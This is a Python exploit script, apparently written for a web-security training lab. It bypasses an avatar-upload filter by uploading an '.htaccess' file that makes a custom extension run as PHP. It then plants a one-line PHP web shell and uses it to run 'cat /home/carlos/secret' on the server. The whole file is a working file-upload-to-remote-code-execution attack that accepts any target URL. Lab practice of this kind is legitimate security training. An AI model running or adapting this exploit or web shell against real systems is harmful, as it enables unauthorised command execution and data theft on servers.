import requests, sys, re, urllib3
import random, string
from bs4 import BeautifulSoup
from requests_toolbelt import MultipartEncoder

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http":"http://127.0.0.1:8087", "https":"http://127.0.0.1:8087"}

def get_csrf_token(session, url, default="/cart/order-confirmation?order-confirmed=true"):

    res = session.get(url, proxies=proxies, verify=False)
    soup = BeautifulSoup(res.text, 'html.parser')
    csrf_input = soup.find('input', {'name': 'csrf'})

    if csrf_input:
        csrf_token = csrf_input.get('value')
        return csrf_token
    else:
        print("CSRF token not found in the HTML.")
        return None


def file_upload_exploit(session, url) :
    login_url = url + '/login'
    csrf_token = get_csrf_token(session, login_url)
    data = {'csrf':csrf_token,'username':'wiener','password':'peter'}
    res = session.post(login_url, data=data, verify=False, proxies=proxies)

    if "Log out" in res.text :
        print("(+) The wiener user log in successfully!")

        matches = re.search(r'<input required type="hidden" name="csrf" value="(.*)">', res.text)

        if matches :
            print("(+) Successfully retrieve the csrf token.")
            csrf_token = matches.group(1)

            if csrf_token :

                avatar_url = url + "/my-account/avatar"
                data = {
                    "avatar":(".htaccess","AddType application/x-httpd-php .test", "application/octet-stream"),
                    "user":"wiener",
                    "csrf":csrf_token
                }

                boundary = "-----------------------------" + "".join(random.choices(string.digits, k=30))

                m = MultipartEncoder(fields=data, boundary=boundary)

                headers = {"Content-Type":m.content_type}

                r1 = session.post(avatar_url, data=m, headers=headers, verify=False, proxies=proxies)

                data2 = {
                    "avatar":("test.test","<?php system($_GET['cmd']); ?>","application/x-php"),
                    "user":"wiener",
                    "csrf":csrf_token
                }

                m2 = MultipartEncoder(fields=data2, boundary=boundary)

                headers = {"Content-Type":m2.content_type}

                r2 = session.post(avatar_url, data=m2, headers=headers, verify=False, proxies=proxies)

                if r1.status_code == 200 and r2.status_code == 200 :
                    print("(+) Successfully update the avatar image.")
                    exploit_url = url + "/files/avatars/test.test?cmd=cat /home/carlos/secret"
                    r = session.get(exploit_url, verify=False, proxies=proxies)

                    if r.status_code == 200 :
                        print("(+) Successfully retrieve the carlos user's secret.")
                        print(r.text)
                    else :
                        print("(-) Could not retrieve the carlos user's secret.")
                else :
                    print("(-) Could not update the avatar image.")
                    sys.exit(-1)
        else :
            print("(-) Could not find the csrf token.")
            sys.exit(-1)
    else :
        print("(-) Could not login as the wiener user.")
        sys.exit(-1)


if __name__ == "__main__" :
    try :
        url = sys.argv[1]
    except IndexError :
        print("(+) Usage : %s <url>" % sys.argv[0])
        print("(+) Example : %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    session = requests.Session()
    file_upload_exploit(session, url)